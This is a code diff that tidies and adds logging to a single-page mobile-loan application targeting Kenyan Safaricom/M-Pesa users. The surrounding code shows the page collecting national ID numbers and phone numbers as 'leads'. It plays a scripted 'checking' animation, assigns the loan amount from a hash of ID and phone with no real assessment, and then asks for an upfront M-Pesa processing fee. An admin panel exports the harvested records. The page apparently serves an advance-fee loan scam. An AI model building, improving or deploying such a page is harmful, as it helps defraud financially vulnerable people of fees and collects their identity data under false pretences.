@@ -60,7 +60,7 @@
         /* CONSENT */
         .consent-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 15px; margin: 15px 0; }
         .consent-item { display: flex; align-items: flex-start; gap: 10px; padding: 6px 0; }
-        .consent-item input { width: 16px; height: 16px; margin-top: 2px; }
+        .consent-item input { width: 16px; height: 16px; margin-top: 2px; accent-color: #0B4F6C; }
         .consent-item label { font-size: 0.8em; color: #1e293b; }
         .consent-item a { color: #0B4F6C; text-decoration: none; font-weight: 500; }
         .consent-item a:hover { text-decoration: underline; }
@@ -77,7 +77,7 @@
         .slider-container { margin: 15px 0; }
         .slider-labels { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 0.8em; }
         .slider-labels span:last-child { color: #f59e0b; font-weight: 600; }
-        input[type=range] { width: 100%; height: 4px; border-radius: 2px; background: rgba(255,255,255,0.2); -webkit-appearance: none; }
+        input[type=range] { width: 100%; height: 4px; border-radius: 2px; background: rgba(255,255,255,0.2); -webkit-appearance: none; accent-color: #f59e0b; }
         input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: white; border-radius: 50%; border: 2px solid #f59e0b; cursor: pointer; }
         .repayment-summary { background: rgba(255,255,255,0.1); border-radius: 10px; padding: 12px; margin: 12px 0; font-size: 0.8em; }
         .summary-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px dashed rgba(255,255,255,0.2); }
@@ -626,12 +626,27 @@ let activeFilter    = 'all';
 const STORE_KEY = 'scb_leads_v2';
 
 function getLeads() {
-    try { return JSON.parse(localStorage.getItem(STORE_KEY)) || []; }
-    catch(e) { return []; }
+    try { 
+        const data = localStorage.getItem(STORE_KEY);
+        return data ? JSON.parse(data) : []; 
+    }
+    catch(e) { 
+        console.error('Error reading leads from localStorage:', e);
+        return []; 
+    }
 }
 
 function saveLeads(leads) {
-    localStorage.setItem(STORE_KEY, JSON.stringify(leads));
+    try {
+        localStorage.setItem(STORE_KEY, JSON.stringify(leads));
+        console.log(`Saved ${leads.length} leads to localStorage`);
+    } catch(e) {
+        console.error('Error saving leads to localStorage:', e);
+        // Try to alert user if storage is full
+        if (e.name === 'QuotaExceededError') {
+            alert('Storage is full! Please clear some data from the admin panel.');
+        }
+    }
 }
 
 // ============================================================
@@ -675,7 +690,7 @@ function generateHash(str) {
     let hash = 0;
     for (let i = 0; i < str.length; i++) {
         hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash = hash & hash;
+        hash = hash & hash; // Convert to 32-bit integer
     }
     return Math.abs(hash);
 }
@@ -683,11 +698,16 @@ function generateHash(str) {
 /** Create a minimal lead record when Step 1 is submitted */
 function createLead(idNumber, phoneNumber) {
     const leads = getLeads();
+    
+    // Check for existing lead with same ID and phone
     const existing = leads.find(l => l.idNumber === idNumber && l.phoneNumber === phoneNumber);
     if (existing) {
         currentLeadId = existing.recordId;
+        console.log('Found existing lead:', existing.recordId);
         return existing;
     }
+    
+    // Create new lead record
     const record = {
         recordId:       genId(),
         idNumber,
@@ -703,20 +723,32 @@ function createLead(idNumber, phoneNumber) {
         submittedAt:    null,
         lastUpdated:    new Date().toISOString()
     };
+    
     leads.push(record);
     saveLeads(leads);
     currentLeadId = record.recordId;
+    console.log('Created new lead:', record.recordId);
     return record;
 }
 
 /** Update any fields on the current lead */
 function updateLead(fields) {
-    if (!currentLeadId) return;
+    if (!currentLeadId) {
+        console.warn('No currentLeadId set, cannot update lead');
+        return;
+    }
+    
     const leads = getLeads();
     const idx   = leads.findIndex(l => l.recordId === currentLeadId);
-    if (idx === -1) return;
+    
+    if (idx === -1) {
+        console.warn('Lead not found:', currentLeadId);
+        return;
+    }
+    
     Object.assign(leads[idx], fields, { lastUpdated: new Date().toISOString() });
     saveLeads(leads);
+    console.log('Updated lead:', currentLeadId, fields);
 }
 
 /** Look up leads for a given ID+phone pair */
@@ -729,11 +761,27 @@ function findLeadsForUser(idNumber, phoneNumber) {
 // ============================================================
 function checkIdPhoneBinding(idNumber, phoneNumber) {
     const leads = getLeads();
-    const idConflict    = leads.find(l => l.idNumber === idNumber    && l.phoneNumber !== phoneNumber);
+    
+    // Check if ID is already used with a different phone
+    const idConflict = leads.find(l => l.idNumber === idNumber && l.phoneNumber !== phoneNumber);
+    
+    // Check if phone is already used with a different ID
     const phoneConflict = leads.find(l => l.phoneNumber === phoneNumber && l.idNumber !== idNumber);
-    if (idConflict || phoneConflict) {
-        return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
+    
+    if (idConflict) {
+        return { 
+            valid: false, 
+            message: "This ID number is already registered with a different phone number. Please check your information or contact support." 
+        };
     }
+    
+    if (phoneConflict) {
+        return { 
+            valid: false, 
+            message: "This phone number is already registered with a different ID. Please check your information or contact support." 
+        };
+    }
+    
     return { valid: true };
 }
 
@@ -741,17 +789,25 @@ let bindingDebounceTimer = null;
 function checkBindingOnInput() {
     const id    = document.getElementById('idNumber').value;
     const phone = document.getElementById('phoneNumber').value;
+    
     clearTimeout(bindingDebounceTimer);
+    
     if (id.length >= 5 && isSafaricom(phone)) {
         bindingDebounceTimer = setTimeout(() => {
             const result = checkIdPhoneBinding(id, phone);
             isBindingValid = result.valid;
-            if (!result.valid) showBindingError(result.message);
-            else { hideBindingError(); checkStep1Complete(); }
+            
+            if (!result.valid) {
+                showBindingError(result.message);
+            } else {
+                hideBindingError();
+                checkStep1Complete();
+            }
         }, 300);
     } else {
         hideBindingError();
         isBindingValid = true;
+        checkStep1Complete();
     }
 }
 
@@ -761,6 +817,7 @@ function showBindingError(msg) {
     document.getElementById('bindingErrorMessage').innerText = msg;
     document.getElementById('continueBtn1').disabled = true;
 }
+
 function hideBindingError() {
     document.getElementById('bindingError').style.display = 'none';
 }
@@ -771,7 +828,8 @@ function hideBindingError() {
 function isSafaricom(phone) {
     const num = phone.replace(/\D/g,'');
     if (num.length !== 10) return false;
-    return ['070','071','072','074','075','076','079','011','010'].includes(num.substring(0,3));
+    const prefixes = ['070','071','072','074','075','076','079','011','010'];
+    return prefixes.includes(num.substring(0,3));
 }
 
 function validateIdNumber() {
@@ -805,18 +863,28 @@ function checkStep1Complete() {
 function showStep(step) {
     [1,2,3,4].forEach(n => document.getElementById('step'+n).classList.add('hidden'));
     document.getElementById('step'+step).classList.remove('hidden');
+    
     [1,2,3,4].forEach(n => {
         const p = document.getElementById('progress'+n);
         p.classList.remove('active','completed');
         if (n === step) p.classList.add('active');
         else if (n < step) p.classList.add('completed');
     });
+    
     currentStep = step;
 }
 
-function navigateToStep(step) { if (step <= currentStep) showStep(step); }
-function goBack()          { showStep(1); }
-function goBackToOffer()   { showStep(2); }
+function navigateToStep(step) { 
+    if (step <= currentStep) showStep(step); 
+}
+
+function goBack() { 
+    showStep(1); 
+}
+
+function goBackToOffer() { 
+    showStep(2); 
+}
 
 function goToPayment() {
     document.getElementById('modalLoanAmount').innerText    = `KSh ${qualifiedAmount.toLocaleString()}`;
@@ -833,6 +901,8 @@ function startOver() {
     document.getElementById('bindingError').style.display = 'none';
     isBindingValid = true;
     currentLeadId  = null;
+    qualifiedAmount = 0;
+    processingFee = 0;
     showStep(1);
 }
 
@@ -845,15 +915,20 @@ function processStep1() {
 
     // Final binding check
     const check = checkIdPhoneBinding(id, phone);
-    if (!check.valid) { showBindingError(check.message); return; }
+    if (!check.valid) { 
+        showBindingError(check.message); 
+        return; 
+    }
 
     // ── 1. Save/retrieve the lead record NOW (stage = 'lead') ──
     const record = createLead(id, phone);
+    console.log('Lead record created/retrieved:', record);
 
     // Check if returning user (has existing offer/application)
     const userLeads = findLeadsForUser(id, phone);
-    const latestWithOffer = userLeads.filter(l => l.stage !== 'lead')
-                                     .sort((a,b) => new Date(b.capturedAt) - new Date(a.capturedAt))[0];
+    const latestWithOffer = userLeads
+        .filter(l => l.stage !== 'lead')
+        .sort((a,b) => new Date(b.capturedAt) - new Date(a.capturedAt))[0];
 
     if (latestWithOffer) {
         currentLeadId = latestWithOffer.recordId;
@@ -883,12 +958,13 @@ function processStep1() {
         if (messageIndex < progressMessages.length) {
             progressStatus.innerText      = progressMessages[messageIndex].status;
             progressDetail.innerText      = progressMessages[messageIndex].detail;
-            progressFill.style.width      = progress + '%';
+            progressFill.style.width      = Math.min(progress, 100) + '%';
         }
     }, 2500);
 
     setTimeout(() => {
         clearInterval(iv);
+        progressFill.style.width = '100%';
 
         const hash = generateHash(id + phone);
         const loan = loans[hash % loans.length];
@@ -932,8 +1008,8 @@ function showReturningUserStep2(record) {
     // Restore amounts so payment step works if they retry
     if (record.qualifiedAmount) {
         qualifiedAmount = record.qualifiedAmount;
-        processingFee   = record.processingFee;
-        interestRate    = record.interestRate;
+        processingFee   = record.processingFee || 0;
+        interestRate    = record.interestRate || 0.09;
     }
 
     const msgDiv = document.getElementById('statusMessage');
@@ -971,7 +1047,11 @@ function showReturningUserStep2(record) {
             <p>KSh ${amount}</p>
             <p style="margin-top:8px;">Your application was declined</p>
         `;
-        declinedAppData = { recordId: record.recordId, amount: record.qualifiedAmount, fee: record.processingFee };
+        declinedAppData = { 
+            recordId: record.recordId, 
+            amount: record.qualifiedAmount, 
+            fee: record.processingFee 
+        };
         document.getElementById('retrySection').classList.remove('hidden');
     }
 }
@@ -982,11 +1062,13 @@ function showReturningUserStep2(record) {
 function updateRepaymentTerms() {
     selectedTenure = parseInt(document.getElementById('tenureSlider').value);
     document.getElementById('selectedMonths').innerText = selectedTenure + (selectedTenure === 1 ? ' month' : ' months');
+    
     if (qualifiedAmount > 0) {
         const r       = interestRate;
         const n       = selectedTenure;
         const monthly = qualifiedAmount * r * Math.pow(1+r,n) / (Math.pow(1+r,n) - 1);
         const total   = monthly * n;
+        
         document.getElementById('monthlyPayment').innerText  = `KSh ${Math.round(monthly).toLocaleString()}`;
         document.getElementById('totalInterest').innerText   = `KSh ${Math.round(total - qualifiedAmount).toLocaleString()}`;
         document.getElementById('totalRepayment').innerText  = `KSh ${Math.round(total).toLocaleString()}`;
@@ -998,8 +1080,12 @@ function updateRepaymentTerms() {
 // ============================================================
 function submitForApproval() {
     const msg = document.getElementById('mpesaMessage').value.trim();
-    if (!msg) { alert('Please paste your M-Pesa confirmation message'); return; }
+    if (!msg) { 
+        alert('Please paste your M-Pesa confirmation message'); 
+        return; 
+    }
 
+    // Extract confirmation code
     const codeMatch = msg.match(/[A-Z0-9]{6,12}/);
     const mpesaCode = codeMatch ? codeMatch[0] : msg.substring(0,10).toUpperCase();
 
@@ -1018,31 +1104,39 @@ function submitForApproval() {
 // ============================================================
 //  RETRY
 // ============================================================
-function showRetryModal()  { document.getElementById('retryModal').classList.add('show'); }
-function closeRetryModal() { document.getElementById('retryModal').classList.remove('show'); }
+function showRetryModal() { 
+    document.getElementById('retryModal').classList.add('show'); 
+}
+
+function closeRetryModal() { 
+    document.getElementById('retryModal').classList.remove('show'); 
+}
 
 function confirmRetry() {
     closeRetryModal();
+    
     if (declinedAppData) {
-        // Create fresh lead for retry, keeping same amounts
         const id    = document.getElementById('idNumber').value;
         const phone = document.getElementById('phoneNumber').value;
 
         // Remove old declined record so binding check passes
         const leads = getLeads();
         const idx   = leads.findIndex(l => l.recordId === declinedAppData.recordId);
-        if (idx !== -1) leads.splice(idx, 1);
-        saveLeads(leads);
+        if (idx !== -1) {
+            leads.splice(idx, 1);
+            saveLeads(leads);
+        }
 
+        // Create fresh lead for retry
         const fresh = createLead(id, phone);
         qualifiedAmount = declinedAppData.amount;
-        processingFee   = declinedAppData.fee;
+        processingFee   = declinedAppData.fee || 0;
 
         updateLead({
             stage:           'offered',
             qualifiedAmount,
             processingFee,
-            interestRate,
+            interestRate:    interestRate || 0.09,
             offeredAt:       new Date().toISOString()
         });
 
@@ -1056,8 +1150,14 @@ function confirmRetry() {
 function showTerms(type) {
     document.getElementById(type === 'terms' ? 'termsModal' : 'privacyModal').classList.add('show');
 }
-function closeTerms()   { document.getElementById('termsModal').classList.remove('show'); }
-function closePrivacy() { document.getElementById('privacyModal').classList.remove('show'); }
+
+function closeTerms() { 
+    document.getElementById('termsModal').classList.remove('show'); 
+}
+
+function closePrivacy() { 
+    document.getElementById('privacyModal').classList.remove('show'); 
+}
 
 // ============================================================
 //  COPY
@@ -1067,7 +1167,10 @@ function copyToClipboard(text) {
         .then(() => showToast('Copied!'))
         .catch(()  => alert('Press Ctrl+C to copy'));
 }
-function copyAmount() { copyToClipboard(document.getElementById('copyAmount').innerText); }
+
+function copyAmount() { 
+    copyToClipboard(document.getElementById('copyAmount').innerText); 
+}
 
 function showToast(msg) {
     const t = document.getElementById('toast');
@@ -1147,13 +1250,13 @@ function setFilter(filter, el) {
 // ============================================================
 function loadApplications() {
     let leads = getLeads();
-    const search = (document.getElementById('adminSearch').value || '').toLowerCase().trim();
+    const search = (document.getElementById('adminSearch')?.value || '').toLowerCase().trim();
 
     // Search filter
     if (search) {
         leads = leads.filter(l =>
-            (l.idNumber    && l.idNumber.includes(search)) ||
-            (l.phoneNumber && l.phoneNumber.includes(search)) ||
+            (l.idNumber    && l.idNumber.toLowerCase().includes(search)) ||
+            (l.phoneNumber && l.phoneNumber.toLowerCase().includes(search)) ||
             (l.mpesaRef    && l.mpesaRef.toLowerCase().includes(search))
         );
     }
@@ -1178,16 +1281,20 @@ function loadApplications() {
     };
 
     const statsEl = document.getElementById('adminStats');
-    statsEl.innerHTML = `
-        <div class="stat-pill s-all">     📊 Total: <strong>${statData.all}</strong></div>
-        <div class="stat-pill s-lead">    🔵 Leads: <strong>${statData.lead}</strong></div>
-        <div class="stat-pill s-offered"> 💡 Offered: <strong>${statData.offered}</strong></div>
-        <div class="stat-pill s-pending"> ⏳ Pending: <strong>${statData.pending}</strong></div>
-        <div class="stat-pill s-approved">✅ Approved: <strong>${statData.approved}</strong></div>
-        <div class="stat-pill s-declined">❌ Declined: <strong>${statData.declined}</strong></div>
-    `;
+    if (statsEl) {
+        statsEl.innerHTML = `
+            <div class="stat-pill s-all">     📊 Total: <strong>${statData.all}</strong></div>
+            <div class="stat-pill s-lead">    🔵 Leads: <strong>${statData.lead}</strong></div>
+            <div class="stat-pill s-offered"> 💡 Offered: <strong>${statData.offered}</strong></div>
+            <div class="stat-pill s-pending"> ⏳ Pending: <strong>${statData.pending}</strong></div>
+            <div class="stat-pill s-approved">✅ Approved: <strong>${statData.approved}</strong></div>
+            <div class="stat-pill s-declined">❌ Declined: <strong>${statData.declined}</strong></div>
+        `;
+    }
 
     const list = document.getElementById('applicationsList');
+    if (!list) return;
+    
     list.innerHTML = '';
 
     if (leads.length === 0) {
@@ -1284,16 +1391,24 @@ function clearAllData() {
 // ============================================================
 function exportCSV() {
     const leads = getLeads();
-    if (leads.length === 0) { showToast('No records to export'); return; }
+    if (leads.length === 0) { 
+        showToast('No records to export'); 
+        return; 
+    }
 
     const headers = ['Record ID','ID Number','Phone','Stage','Allocated Amount (KSh)','Processing Fee (KSh)',
                      'Interest Rate','Tenure (months)','M-Pesa Ref','Captured At','Offered At','Submitted At','Last Updated'];
 
     const rows = leads.map(l => [
-        l.recordId, l.idNumber, l.phoneNumber, l.stage,
-        l.qualifiedAmount || '', l.processingFee || '',
+        l.recordId || '',
+        l.idNumber || '',
+        l.phoneNumber || '',
+        l.stage || '',
+        l.qualifiedAmount || '',
+        l.processingFee || '',
         l.interestRate ? (l.interestRate * 100) + '%' : '',
-        l.selectedTenure || '', l.mpesaRef || '',
+        l.selectedTenure || '',
+        l.mpesaRef || '',
         l.capturedAt  ? new Date(l.capturedAt).toLocaleString()  : '',
         l.offeredAt   ? new Date(l.offeredAt).toLocaleString()   : '',
         l.submittedAt ? new Date(l.submittedAt).toLocaleString() : '',
@@ -1322,9 +1437,13 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(1);
     document.getElementById('consentBox').style.display = 'block';
     checkAdminHash();
+    
+    // Log current localStorage state
+    const leads = getLeads();
+    console.log(`Loaded ${leads.length} leads from localStorage on init`);
 });
 
 window.addEventListener('hashchange', checkAdminHash);
 </script>
 </body>
-</html>
+    </html>
